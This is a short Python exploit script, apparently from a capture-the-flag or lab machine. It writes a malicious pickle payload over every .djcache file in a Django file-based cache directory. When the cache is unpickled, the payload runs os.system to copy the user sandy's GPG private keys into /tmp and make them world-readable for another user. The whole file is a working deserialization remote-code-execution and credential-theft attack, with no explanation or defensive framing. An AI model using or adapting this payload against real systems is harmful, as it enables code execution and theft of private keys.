#!/usr/bin/env python3
import pickle
import os

CACHE_DIR = "/var/tmp/django_cache"

# Copy GPG private keys to /tmp where mikey can read
cmd = "cp /home/sandy/.gnupg/private-keys-v1.d/*.* /tmp/ 2>/dev/null; chmod 644 /tmp/*.key /tmp/*.asc 2>/dev/null"

class RCE:
    def __reduce__(self):
        return (os.system, (cmd,))

payload = pickle.dumps(RCE())

for filename in os.listdir(CACHE_DIR):
    if filename.endswith(".djcache"):
        path = os.path.join(CACHE_DIR, filename)
        os.remove(path)
        with open(path, "wb") as f:
            f.write(payload)

print("[+] Payload written")
